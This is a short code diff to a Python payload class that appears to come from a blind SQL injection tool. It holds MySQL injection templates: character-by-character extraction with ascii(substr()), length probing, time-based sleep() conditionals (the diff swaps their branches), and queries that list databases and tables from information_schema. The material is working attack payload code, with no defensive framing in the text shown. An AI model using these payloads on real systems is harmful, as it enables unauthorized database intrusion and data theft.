@@ -4,8 +4,8 @@ class payload:
 
     pascii = r'ascii(substr(({pl}),{n},1)){tj}{end}'
     plength = r'length(({pl})){tj}{end}'
-    tpascii = r"if(ascii(substr(({pl}),{n},1)){tj},1,sleep(%d)){end}"%config.time
-    tplength = r"if(length(({pl})){tj},1,sleep(%d)){end}"%config.time
+    tpascii = r"if(ascii(substr(({pl}),{n},1)){tj},sleep(%d),1){end}"%config.time
+    tplength = r"if(length(({pl})){tj},sleep(%d),1){end}"%config.time
     curdb = 'database()'
     dbs='select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA'
     tbs="select group_concat(table_name) from information_schema.tables where table_schema='{db}'"
